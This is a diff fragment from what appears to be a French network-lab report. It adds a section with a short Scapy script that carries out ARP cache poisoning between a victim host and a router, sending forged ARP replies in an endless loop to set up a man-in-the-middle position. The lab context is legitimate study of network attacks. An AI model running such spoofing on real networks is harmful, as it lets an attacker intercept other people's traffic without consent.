@@ -236,3 +236,14 @@ La capture est sous le nom : arp.pcapng
 
 La capture est sous le nom : arp_mitm.pcap
 
+## 🌞 Réaliser la même attaque avec Scapy
+
+    from scapy.all import *
+
+    victime = Ether(dst="00:50:79:66:68:00")/ARP (pdst="10.2.1.10", psrc="10.2.1.254")
+    routeur = Ether(dst="0c:0a:72:00:00:01")/ARP (pdst="10.2.1.254", psrc="10.2.1.10")
+
+    while True:
+    
+	    sendp(victime, iface="enp0s3")
+	    sendp(routeur, iface="enp0s3")
